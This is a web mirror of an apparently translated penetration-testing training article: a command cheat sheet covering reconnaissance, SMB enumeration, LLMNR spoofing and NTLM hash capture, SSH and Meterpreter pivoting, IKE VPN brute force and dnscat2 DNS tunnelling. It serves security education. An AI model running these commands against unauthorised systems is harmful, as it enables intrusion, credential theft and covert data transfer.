<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>"Zero Security: A" - the initial level of training in the field of practical information security</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="One of the main activities of Pentestit is the development of specialized initial (Zero Security: A) and professional (Corporate Laboratories) trainin...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>"Zero Security: A" - the initial level of training in the field of practical information security</h1><div class="post__text post__text-html js-mediator-article"><p><img src="https://hsto.org/files/1fb/3e4/ebb/1fb3e4ebbb724ed2850bbe912ed3cdcc.png" alt="image"></p><br><p>  One of the main activities of Pentestit is the development of specialized initial (Zero Security: A) and professional (Corporate Laboratories) training programs in the field of information security.  Regardless of the training programs, their key features are relevant material and practical training in pentest laboratories, making up 80% of the total program of the course.  <strong>In this article we will examine the basis of commands and useful tricks when testing for penetration of the external perimeter.</strong> </p><a name="habracut"></a><br><p>  Many newbies, when working with specialized distributions (Kali Linux, BlackArch, BackBox, etc.), are confronted with a lack of knowledge of the basic command syntax and elementary tools when performing penetration testing.  Indeed, there are now quite a few utilities and techniques for their use, which involuntarily "run up the eyes," what, when and in what case to use.  To do this, we have prepared a brief guide to the main commands and utilities. </p><br><h2>  Pentester's Handbook Part 1 </h2><br><p>  This handbook is a list of commands that you may need when conducting penetration testing.  This handbook is designed in such a way that it does not provide a detailed description of the commands, but only gives working examples.  For more information about the team or utility, we recommend that you study its man page or visit the official website. </p><br><p>  This handbook is more concerned with network and infrastructure testing.  Testing web applications is not covered in this reference, except for a few examples with sqlmap at the end of this tutorial. </p><br><h3>  Network configuration </h3><br><p>  Assign IP Address </p><br><pre><code class="hljs nginx"><span class="hljs-attribute"><span class="hljs-attribute">ifconfig</span></span> eth0 xxx.xxx.xxx.xxx/<span class="hljs-number"><span class="hljs-number">24</span></span></code> </pre> <br><p>  Subnet Information </p><br><pre> <code class="hljs nginx"><span class="hljs-attribute"><span class="hljs-attribute">ipcalc</span></span> xxx.xxx.xxx.xxx/<span class="hljs-number"><span class="hljs-number">24</span></span> ipcalc xxx.xxx.xxx.xxx <span class="hljs-number"><span class="hljs-number">255.255.255.0</span></span></code> </pre> <br><h3>  OSINT (collection of information) </h3><br><p>  WHOIS: </p><br><pre> <code class="hljs pgsql">whois <span class="hljs-keyword"><span class="hljs-keyword">domain</span></span>-<span class="hljs-type"><span class="hljs-type">name</span></span>-here.com</code> </pre> <br><p>  Performing DNS lookup queries: </p><br><pre> <code class="hljs nginx"><span class="hljs-attribute"><span class="hljs-attribute">dig</span></span> <span class="hljs-variable"><span class="hljs-variable">@nameserver</span></span> domainname.com A</code> </pre> <br><p>  MX Record Detection: </p><br><pre> <code class="hljs nginx"><span class="hljs-attribute"><span class="hljs-attribute">dig</span></span> <span class="hljs-variable"><span class="hljs-variable">@nameserver</span></span> domainname.com MX</code> </pre> <br><p>  Performing a Zone Transfer request using DIG: </p><br><pre> <code class="hljs nginx"><span class="hljs-attribute"><span class="hljs-attribute">dig</span></span> <span class="hljs-variable"><span class="hljs-variable">@nameserver</span></span> domainname.com AXFR</code> </pre> <br><h4>  DNS Transfer Zone </h4><br><p>  Windows DNS zone transfer </p><br><pre> <code class="hljs pgsql">nslookup -&gt; <span class="hljs-keyword"><span class="hljs-keyword">set</span></span> <span class="hljs-keyword"><span class="hljs-keyword">type</span></span>=<span class="hljs-keyword"><span class="hljs-keyword">any</span></span> -&gt; ls -d blah.com</code> </pre> <br><p>  Linux DNS zone transfer </p><br><pre> <code class="hljs css"><span class="hljs-selector-tag"><span class="hljs-selector-tag">dig</span></span> @<span class="hljs-keyword"><span class="hljs-keyword">ns1</span></span>.<span class="hljs-keyword"><span class="hljs-keyword">blah</span></span>.<span class="hljs-keyword"><span class="hljs-keyword">com</span></span> blah.com axfr</code> </pre> <br><h4>  Email </h4><br><p>  Use Simply Email to collect mailing addresses of the specified domain from public sources (github, target site, etc.).  The utility works more productively if you use a proxy and large values ‚Äã‚Äãof delays, so that google will not consider the activity suspicious and issue a captcha. </p><br><pre> <code class="hljs pgsql">git clone https://github.com/killswitch-GUI/SimplyEmail.git ./SimplyEmail.py -<span class="hljs-keyword"><span class="hljs-keyword">all</span></span> -e TARGET-<span class="hljs-keyword"><span class="hljs-keyword">DOMAIN</span></span></code> </pre> <br><p>  Simply Email can check for detected email addresses after collection. </p><br><h4>  Manual finger printing / banner grabbing </h4><br><p>  Getting information about SMTP service through a banner </p><br><pre> <code class="hljs css"><span class="hljs-selector-tag"><span class="hljs-selector-tag">nc</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">-v</span></span> 192<span class="hljs-selector-class"><span class="hljs-selector-class">.168</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.1</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.1</span></span> 25 <span class="hljs-selector-tag"><span class="hljs-selector-tag">telnet</span></span> 192<span class="hljs-selector-class"><span class="hljs-selector-class">.168</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.1</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.1</span></span> 25</code> </pre> <br><p>  Getting a banner with NC </p><br><pre> <code class="hljs pgsql">nc TARGET-IP <span class="hljs-number"><span class="hljs-number">80</span></span> <span class="hljs-keyword"><span class="hljs-keyword">GET</span></span> / HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span> Host: TARGET-IP <span class="hljs-keyword"><span class="hljs-keyword">User</span></span>-Agent: Mozilla/<span class="hljs-number"><span class="hljs-number">5.0</span></span> Referrer: meh-<span class="hljs-keyword"><span class="hljs-keyword">domain</span></span> &lt;enter&gt;</code> </pre> <br><h4>  DNS Brutfors </h4><br><p>  DNSRecon </p><br><pre> <code class="hljs pgsql">dnsrecon -d TARGET -D /usr/<span class="hljs-keyword"><span class="hljs-keyword">share</span></span>/wordlists/dnsmap.txt -t std <span class="hljs-comment"><span class="hljs-comment">--xml output.xml</span></span></code> </pre> <br><h4>  Port scan </h4><br><p>  Nmap scanning with detailed output, syn method, T4 speed (suitable for LAN), obtaining information about OS version and services, traceroute and NSE scripts for found services </p><br><pre> <code class="hljs nginx"><span class="hljs-attribute"><span class="hljs-attribute">nmap</span></span> -v -sS -A -T4 target</code> </pre> <br><p>  Same as above, scanning all TCP, even if the host does not respond to ICMP requests (takes longer) </p><br><pre> <code class="hljs nginx"><span class="hljs-attribute"><span class="hljs-attribute">nmap</span></span> -v -sS -p- -A -T4 -Pn target</code> </pre> <br><p>  Same as above + UDP scan range (takes a lot of time) </p><br><pre> <code class="hljs nginx"><span class="hljs-attribute"><span class="hljs-attribute">nmap</span></span> -v -sU -sS -p- -A -T4 target</code> </pre> <br><p>  Nmap script to detect vulnerable SMB servers (ATTENTION: unsafe = 1 may cause an error on the server) </p><br><pre> <code class="hljs cs">nmap -v -p <span class="hljs-number"><span class="hljs-number">445</span></span> --script=smb-check-vulns --script-args=<span class="hljs-keyword"><span class="hljs-keyword">unsafe</span></span>=<span class="hljs-number"><span class="hljs-number">1</span></span> <span class="hljs-number"><span class="hljs-number">192.168</span></span><span class="hljs-number"><span class="hljs-number">.1</span></span>.X</code> </pre> <br><p>  Search NSE scripts by regular expressions </p><br><pre> <code class="hljs pgsql">ls /usr/<span class="hljs-keyword"><span class="hljs-keyword">share</span></span>/nmap/scripts<span class="hljs-comment"><span class="hljs-comment">/* | grep ftp</span></span></code> </pre> <br><p>  Nmap UDP scan </p><br><pre> <code class="hljs nginx"><span class="hljs-attribute"><span class="hljs-attribute">nmap</span></span> -sU target</code> </pre> <br><p>  UDP Protocol Scanner </p><br><pre> <code class="hljs php">git <span class="hljs-keyword"><span class="hljs-keyword">clone</span></span> https:<span class="hljs-comment"><span class="hljs-comment">//github.com/portcullislabs/udp-proto-scanner.git</span></span></code> </pre> <br><p>  The command to scan IP addresses from a file across all services: </p><br><pre> <code class="hljs">./udp-proto-scanner.pl -f ip.txt</code> </pre> <br><p>  Scan a specific UDP service: </p><br><pre> <code class="hljs css"><span class="hljs-selector-tag"><span class="hljs-selector-tag">udp-proto-scanner</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.pl</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">-p</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">ntp</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">-f</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">ips</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.txt</span></span></code> </pre> <br><h4>  Other methods for host discovery, without using nmap </h4><br><p>  Checks if a host is available by sending an ARP request: </p><br><pre> <code class="hljs css"><span class="hljs-selector-tag"><span class="hljs-selector-tag">arping</span></span> 192<span class="hljs-selector-class"><span class="hljs-selector-class">.168</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.1</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.1</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">-c</span></span> 1</code> </pre> <br><p>  Discovers IP, MAC addresses in a subnet via ARP (may be useful for checking VLANs): </p><br><pre> <code class="hljs nginx"><span class="hljs-attribute"><span class="hljs-attribute">netdiscover</span></span> -r <span class="hljs-number"><span class="hljs-number">192.168.1.0</span></span>/<span class="hljs-number"><span class="hljs-number">24</span></span></code> </pre> <br><h2>  Detection and operation of network services </h2><br><p>  SMB detection: </p><br><pre> <code class="hljs cmake">smblookup -A <span class="hljs-keyword"><span class="hljs-keyword">target</span></span> smbclient //MOUNT/share -I <span class="hljs-keyword"><span class="hljs-keyword">target</span></span> -N rpcclient -U <span class="hljs-string"><span class="hljs-string">""</span></span> <span class="hljs-keyword"><span class="hljs-keyword">target</span></span> enum4linux <span class="hljs-keyword"><span class="hljs-keyword">target</span></span></code> </pre> <br><p>  Detects Windows / Samba servers in the subnet, identifies the Windows MAC address, netbios name, and workgroup / domain </p><br><pre> <code class="hljs nginx"><span class="hljs-attribute"><span class="hljs-attribute">nbtscan</span></span> <span class="hljs-number"><span class="hljs-number">192.168.1.0</span></span>/<span class="hljs-number"><span class="hljs-number">24</span></span></code> </pre> <br><p>  Determining the version of SMB: </p><br><pre> <code class="hljs nginx"><span class="hljs-attribute"><span class="hljs-attribute">smbclient</span></span> -L //<span class="hljs-number"><span class="hljs-number">192.168.1.100</span></span></code> </pre> <br><p>  Search SMB resources: </p><br><pre> <code class="hljs nginx"><span class="hljs-attribute"><span class="hljs-attribute">nmap</span></span> -T4 -v -oA shares --script=smb-enum-shares --script-args=smbuser=username,smbpass=password -p445 <span class="hljs-number"><span class="hljs-number">192.168.1.0</span></span>/<span class="hljs-number"><span class="hljs-number">24</span></span></code> </pre> <br><p>  SMB user detection: </p><br><pre> <code class="hljs mel">nmap -sU -sS --script=smb-enum-users -p U:<span class="hljs-number"><span class="hljs-number">137</span></span>,T:<span class="hljs-number"><span class="hljs-number">139</span></span> <span class="hljs-number"><span class="hljs-number">192.168</span></span><span class="hljs-number"><span class="hljs-number">.11</span></span><span class="hljs-number"><span class="hljs-number">.200</span></span><span class="hljs-number"><span class="hljs-number">-254</span></span> <span class="hljs-keyword"><span class="hljs-keyword">python</span></span> /usr/share/doc/<span class="hljs-keyword"><span class="hljs-keyword">python</span></span>-impacket-doc/examples/samrdump.py <span class="hljs-number"><span class="hljs-number">192.168</span></span>.XXX.XXX</code> </pre> <br><p>  RID Cycling Attack: </p><br><pre> <code class="hljs css"><span class="hljs-selector-tag"><span class="hljs-selector-tag">ridenum</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.py</span></span> 192<span class="hljs-selector-class"><span class="hljs-selector-class">.168</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.XXX</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.XXX</span></span> 500 50000 <span class="hljs-selector-tag"><span class="hljs-selector-tag">dict</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.txt</span></span></code> </pre> <br><p>  Metasploit module to attack RID cycling: </p><br><pre> <code class="hljs sql"><span class="hljs-keyword"><span class="hljs-keyword">use</span></span> auxiliary/scanner/smb/smb_lookupsid</code> </pre> <br><h4>  Null session manual testing </h4><br><p>  Windows: </p><br><pre> <code class="hljs sql">net <span class="hljs-keyword"><span class="hljs-keyword">use</span></span> \\TARGET\IPC$ <span class="hljs-string"><span class="hljs-string">""</span></span> /u:<span class="hljs-string"><span class="hljs-string">""</span></span></code> </pre> <br><p>  Linux: </p><br><pre> <code class="hljs nginx"><span class="hljs-attribute"><span class="hljs-attribute">smbclient</span></span> -L //<span class="hljs-number"><span class="hljs-number">192.168.99.131</span></span></code> </pre> <br><p>  NBTScan unixwiz </p><br><pre> <code class="hljs css"><span class="hljs-selector-tag"><span class="hljs-selector-tag">apt-get</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">install</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">nbtscan-unixwiz</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">nbtscan-unixwiz</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">-f</span></span> 192<span class="hljs-selector-class"><span class="hljs-selector-class">.168</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.0</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.1-254</span></span> &gt; <span class="hljs-selector-tag"><span class="hljs-selector-tag">nbtscan</span></span></code> </pre> <br><h2>  LLMNR / NBT-NS Spoofing </h2><br><h3>  Metasploit LLMNR / NetBIOS requests: </h3><br><p>  Substitution / modification of LLMNR / NetBIOS requests: </p><br><pre> <code class="hljs">auxiliary/spoof/llmnr/llmnr_response auxiliary/spoof/nbns/nbns_response</code> </pre> <br><p>  Intercept NTLM hashes: </p><br><pre> <code class="hljs pgsql">auxiliary/<span class="hljs-keyword"><span class="hljs-keyword">server</span></span>/capture/smb auxiliary/<span class="hljs-keyword"><span class="hljs-keyword">server</span></span>/capture/http_ntlm</code> </pre> <br><p>  To break an NTLMv2 hash, use john or hashcat. <br>  Alternatively, you can use responder.py. </p><br><pre> <code class="hljs nginx"><span class="hljs-attribute"><span class="hljs-attribute">git</span></span> clone https://github.com/SpiderLabs/Responder.git python Responder.py -i local-ip -I eth0</code> </pre> <br><h2>  SNMP </h2><br><p>  Correction of SNMP values ‚Äã‚Äãin the output for easy perception: </p><br><pre> <code class="hljs swift">apt-<span class="hljs-keyword"><span class="hljs-keyword">get</span></span> install snmp-mibs-downloader download-mibs echo <span class="hljs-string"><span class="hljs-string">""</span></span> &gt; /etc/snmp/snmp.conf</code> </pre> <br><p>  SNMP detection </p><br><pre> <code class="hljs swift">snmpcheck -t <span class="hljs-number"><span class="hljs-number">192.168</span></span>.<span class="hljs-number"><span class="hljs-number">1</span></span>.<span class="hljs-type"><span class="hljs-type">X</span></span> -<span class="hljs-built_in"><span class="hljs-built_in">c</span></span> <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> snmpwalk -<span class="hljs-built_in"><span class="hljs-built_in">c</span></span> <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> -v1 <span class="hljs-number"><span class="hljs-number">192.168</span></span>.<span class="hljs-number"><span class="hljs-number">1</span></span>.<span class="hljs-type"><span class="hljs-type">X</span></span> <span class="hljs-number"><span class="hljs-number">1</span></span>| grep hrSWRunName|cut -d* * -f snmpenum -t <span class="hljs-number"><span class="hljs-number">192.168</span></span>.<span class="hljs-number"><span class="hljs-number">1</span></span>.<span class="hljs-type"><span class="hljs-type">X</span></span> onesixtyone -<span class="hljs-built_in"><span class="hljs-built_in">c</span></span> names -i hosts</code> </pre> <br><p>  Defining SNMPv3 servers with nmap: </p><br><pre> <code class="hljs nginx"><span class="hljs-attribute"><span class="hljs-attribute">nmap</span></span> -sV -p <span class="hljs-number"><span class="hljs-number">161</span></span> --script=snmp-<span class="hljs-literal"><span class="hljs-literal">info</span></span> target-subnet</code> </pre> <br><p>  Rory McCune's script helps automate the user search process for SNMPv3: </p><br><pre> <code class="hljs ruby"><span class="hljs-symbol"><span class="hljs-symbol">https:</span></span>/<span class="hljs-regexp"><span class="hljs-regexp">/raw.githubusercontent.com/raesene</span></span><span class="hljs-regexp"><span class="hljs-regexp">/TestingScripts/master</span></span><span class="hljs-regexp"><span class="hljs-regexp">/snmpv3enum.rb</span></span></code> </pre> <br><p>  Metasploit dictionaries contain standard credentials for SNMP v1 and v2: </p><br><pre> <code class="hljs haskell">/usr/share/metasploit-framework/<span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">data</span></span></span><span class="hljs-class">/wordlists/snmp_default_pass.txt</span></span></code> </pre> <br><h2>  TLS &amp; SSL Testing </h2><br><p>  It tests everything on the selected host and outputs to the file: </p><br><pre> <code class="hljs cmake">./testssl.sh -e -E -f -p -y -Y -S -P -c -H -U <span class="hljs-keyword"><span class="hljs-keyword">TARGET</span></span>-HOST | aha &gt; OUTPUT-<span class="hljs-keyword"><span class="hljs-keyword">FILE</span></span>.html</code> </pre> <br><h2>  Network </h2><br><p>  Remote port forwarding to local: </p><br><pre> <code class="hljs css"><span class="hljs-selector-tag"><span class="hljs-selector-tag">plink</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.exe</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">-P</span></span> 22 <span class="hljs-selector-tag"><span class="hljs-selector-tag">-l</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">root</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">-pw</span></span> "1337" <span class="hljs-selector-tag"><span class="hljs-selector-tag">-R</span></span> 445<span class="hljs-selector-pseudo"><span class="hljs-selector-pseudo">:127.0.0.1</span></span><span class="hljs-selector-pseudo"><span class="hljs-selector-pseudo">:445</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">REMOTE-IP</span></span></code> </pre> <br><p>  Ssh pivoting </p><br><pre> <code class="hljs css"><span class="hljs-selector-tag"><span class="hljs-selector-tag">ssh</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">-D</span></span> 127<span class="hljs-selector-class"><span class="hljs-selector-class">.0</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.0</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.1</span></span><span class="hljs-selector-pseudo"><span class="hljs-selector-pseudo">:1010</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">-p</span></span> 22 <span class="hljs-selector-tag"><span class="hljs-selector-tag">user</span></span>@<span class="hljs-keyword"><span class="hljs-keyword">pivot</span></span>-<span class="hljs-keyword"><span class="hljs-keyword">target</span></span>-<span class="hljs-keyword"><span class="hljs-keyword">ip</span></span></code> </pre> <br><p>  SSH pivoting from one subnet to another: </p><br><pre> <code class="hljs css"><span class="hljs-selector-tag"><span class="hljs-selector-tag">ssh</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">-D</span></span> 127<span class="hljs-selector-class"><span class="hljs-selector-class">.0</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.0</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.1</span></span><span class="hljs-selector-pseudo"><span class="hljs-selector-pseudo">:1010</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">-p</span></span> 22 <span class="hljs-selector-tag"><span class="hljs-selector-tag">user1</span></span>@<span class="hljs-keyword"><span class="hljs-keyword">ip</span></span>-<span class="hljs-keyword"><span class="hljs-keyword">address</span></span>-<span class="hljs-keyword"><span class="hljs-keyword">1</span></span></code> </pre> <br><p>  (add socks4 127.0.0.1 1010 to /etc/proxychains.conf) </p><br><pre> <code class="hljs css"><span class="hljs-selector-tag"><span class="hljs-selector-tag">proxychains</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">ssh</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">-D</span></span> 127<span class="hljs-selector-class"><span class="hljs-selector-class">.0</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.0</span></span><span class="hljs-selector-class"><span class="hljs-selector-class">.1</span></span><span class="hljs-selector-pseudo"><span class="hljs-selector-pseudo">:1011</span></span> <span class="hljs-selector-tag"><span class="hljs-selector-tag">-p</span></span> 22 <span class="hljs-selector-tag"><span class="hljs-selector-tag">user1</span></span>@<span class="hljs-keyword"><span class="hljs-keyword">ip</span></span>-<span class="hljs-keyword"><span class="hljs-keyword">address</span></span>-<span class="hljs-keyword"><span class="hljs-keyword">2</span></span></code> </pre> <br><p>  (add socks4 127.0.0.1 1011 to /etc/proxychains.conf) </p><br><p>  Meterpreter Pivoting </p><br><pre> <code class="hljs pgsql">portfwd <span class="hljs-keyword"><span class="hljs-keyword">add</span></span> ‚Äìl <span class="hljs-number"><span class="hljs-number">3389</span></span> ‚Äìp <span class="hljs-number"><span class="hljs-number">3389</span></span> ‚Äìr target portfwd <span class="hljs-keyword"><span class="hljs-keyword">delete</span></span> ‚Äìl <span class="hljs-number"><span class="hljs-number">3389</span></span> ‚Äìp <span class="hljs-number"><span class="hljs-number">3389</span></span> ‚Äìr target</code> </pre> <br><h4>  VLAN Hopping </h4><br><p>  Using NCCGroups scans VLAN for Yersina simplifies the process. </p><br><pre> <code class="hljs nginx"><span class="hljs-attribute"><span class="hljs-attribute">git</span></span> clone https://github.com/nccgroup/vlan-hopping.git chmod <span class="hljs-number"><span class="hljs-number">700</span></span> frogger.sh ./frogger.sh</code> </pre> <br><h4>  VPN server discovery </h4><br><pre> <code class="hljs swift">./udp-<span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">protocol</span></span></span><span class="hljs-class">-</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">scanner</span></span></span><span class="hljs-class">.</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">pl</span></span></span><span class="hljs-class"> -</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">p</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">ike</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">TARGET</span></span></span><span class="hljs-class">(</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">s</span></span></span><span class="hljs-class">)</span></span></code> </pre> <br><p>  Scanning a range of VPN servers: </p><br><pre> <code class="hljs swift">./udp-<span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">protocol</span></span></span><span class="hljs-class">-</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">scanner</span></span></span><span class="hljs-class">.</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">pl</span></span></span><span class="hljs-class"> -</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">p</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">ike</span></span></span><span class="hljs-class"> -</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">f</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">ip</span></span></span><span class="hljs-class">.</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">txt</span></span></span></span></code> </pre> <br><p>  Use IKEForce to detect or attack a VPN server. </p><br><pre> <code class="hljs sql">pip <span class="hljs-keyword"><span class="hljs-keyword">install</span></span> pyip git <span class="hljs-keyword"><span class="hljs-keyword">clone</span></span> https://github.com/SpiderLabs/ikeforce.git</code> </pre> <br><p>  Perform IKE VPN discovery with IKEForce: </p><br><pre> <code class="hljs cmake">./ikeforce.py <span class="hljs-keyword"><span class="hljs-keyword">TARGET</span></span>-IP ‚Äìe ‚Äìw wordlists/groupnames.dic</code> </pre> <br><p>  Bruteforce IKE VPN with IKEForce: </p><br><pre> <code class="hljs cmake">./ikeforce.py <span class="hljs-keyword"><span class="hljs-keyword">TARGET</span></span>-IP -b -i groupid -u dan -k psk123 -w passwords.txt -s <span class="hljs-number"><span class="hljs-number">1</span></span> ike-scan ike-scan <span class="hljs-keyword"><span class="hljs-keyword">TARGET</span></span>-IP ike-scan -A <span class="hljs-keyword"><span class="hljs-keyword">TARGET</span></span>-IP ike-scan -A <span class="hljs-keyword"><span class="hljs-keyword">TARGET</span></span>-IP --id=myid -P <span class="hljs-keyword"><span class="hljs-keyword">TARGET</span></span>-IP-key</code> </pre> <br><h2>  Tunneling traffic through DNS to bypass the firewall </h2><br><p>  dnscat2 supports ‚Äúdownload‚Äù and ‚Äúupload‚Äù commands for getting files (data or programs) to and from the target machine. <br>  Attacking machine: </p><br><pre> <code class="hljs sql">apt-get <span class="hljs-keyword"><span class="hljs-keyword">update</span></span> apt-<span class="hljs-keyword"><span class="hljs-keyword">get</span></span> -y <span class="hljs-keyword"><span class="hljs-keyword">install</span></span> ruby-dev git make g++ gem <span class="hljs-keyword"><span class="hljs-keyword">install</span></span> bundler git <span class="hljs-keyword"><span class="hljs-keyword">clone</span></span> https://github.com/iagox86/dnscat2.git cd dnscat2/<span class="hljs-keyword"><span class="hljs-keyword">server</span></span> bundle <span class="hljs-keyword"><span class="hljs-keyword">install</span></span></code> </pre> <br><p>  Start dnscat2: </p><br><pre> <code class="hljs pgsql">ruby ./dnscat2.rb dnscat2&gt; <span class="hljs-built_in"><span class="hljs-built_in">New</span></span> <span class="hljs-keyword"><span class="hljs-keyword">session</span></span> established: <span class="hljs-number"><span class="hljs-number">1422</span></span> dnscat2&gt; <span class="hljs-keyword"><span class="hljs-keyword">session</span></span> -i <span class="hljs-number"><span class="hljs-number">1422</span></span></code> </pre> <br><p>  Attacked car: </p><br><pre> <code class="hljs ruby"><span class="hljs-symbol"><span class="hljs-symbol">https:</span></span>/<span class="hljs-regexp"><span class="hljs-regexp">/downloads.skullsecurity.org/dnscat</span></span>2/ <span class="hljs-symbol"><span class="hljs-symbol">https:</span></span>/<span class="hljs-regexp"><span class="hljs-regexp">/github.com/lukebaggett</span></span><span class="hljs-regexp"><span class="hljs-regexp">/dnscat2-powershell/</span></span> dnscat --host &lt;dnscat server_ip&gt;</code> </pre> <br><hr><br><p>  In the following articles, I will supplement the reference book with commands and tricks for exploiting vulnerabilities, brute-force network services, examples of command shells, etc. </p><br><hr><br><h2>  Conclusion </h2><br><p>  In order to successfully resist attackers, it is necessary to know well the methods and tools of work, which is extremely difficult, given their rapid development.  The course program is updated every 3 months (after 1 set), which allows you to provide relevant and relevant knowledge and practical skills in information security. </p><br><p>  The uniqueness of the course program in the presentation and consolidation of the material - 20% of theory and 80% of practice.  Constantly updating the methodological material and adding practical tasks, we try to give the most complete amount of information so that the course participants receive comprehensive information on current threats and methods of counteraction, open new development vectors in the field of practical information security. </p><br><p>  <a href="https://www.pentestit.ru/courses/zerosecurity-a/">View the course program.</a> </p></div>
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <p>Source: <a href="https://habr.com/ru/post/322834/">https://habr.com/ru/post/322834/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../322822/index.html">The reverse side of the operation of payment technologies based on NFC and MST</a></li>
<li><a href="../322824/index.html">SK Telecom begins work on quantum cryptosystems</a></li>
<li><a href="../322826/index.html">Lecture about responsibility</a></li>
<li><a href="../322830/index.html">The market of IT start-ups in retail: the expectations of investors and large customers on the example of FRIA and X5 Retail Group</a></li>
<li><a href="../322832/index.html">Introduction to the IDEF0 notation and usage example</a></li>
<li><a href="../322836/index.html">Simple, modern MVC framework for PHP to develop websites from scratch</a></li>
<li><a href="../322840/index.html">Unsafe continues to live in Java 9</a></li>
<li><a href="../322842/index.html">Minimalism in game design: examples, tips and ideas. Part two</a></li>
<li><a href="../322844/index.html">A quick guide to how to access opensource: who needs it, why and how</a></li>
